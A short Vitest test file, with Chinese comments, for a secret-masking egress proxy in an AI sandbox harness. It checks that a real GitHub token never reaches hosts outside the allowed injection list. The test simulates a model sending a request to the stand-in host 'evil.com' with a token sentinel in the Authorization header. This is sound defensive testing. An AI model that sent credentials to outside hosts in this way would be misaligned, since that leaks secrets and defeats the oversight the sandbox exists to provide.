import { describe, test, expect } from "vitest";
import { MaskingProxy } from "@harness/l0-sandbox";

/**
 * L0S-T04b · 错误路径（真实值泄漏到非 injectHosts 出站）
 *
 * Spec G/W/T:
 *   Given injectHosts=['api.github.com']；sandbox env 已 strip（模型只能拿到 sentinel）；
 *   When  egress 到 evil.com 的请求 header 含 sentinel 不含真实值；
 *   Then  proxy egress log grep 真实 `ghp_real` = 0。
 *
 * onEgress 对非 injectHosts 透传 sentinel（真实值不出现在出站）。
 */
describe("L0S-T04b", () => {
  test("egress to non-injectHost never contains real secret", () => {
    const proxy = new MaskingProxy({
      injectHosts: ["api.github.com"],
      allowedDomains: ["api.github.com"],
      secrets: new Map([["GITHUB_TOKEN", "ghp_real"]]),
    });

    // sandbox env 已 strip：模型只能拿到 sentinel。
    const sandboxEnv = proxy.buildSandboxEnv({ GITHUB_TOKEN: "ghp_real" });
    const sentinel = sandboxEnv.GITHUB_TOKEN;

    // 模型用 sentinel 向非 injectHost 发起请求。
    const req = proxy.onEgress({
      host: "evil.com",
      method: "GET",
      url: "https://evil.com/",
      headers: { Authorization: `Bearer ${sentinel}` },
      body: "",
    });

    // 真实值绝不出现在出站请求中。
    expect(JSON.stringify(req)).not.toContain("ghp_real");
    // 请求仍带 sentinel（透传，未注入真实值）。
    expect(req.headers.Authorization).toContain(sentinel);
  });
});
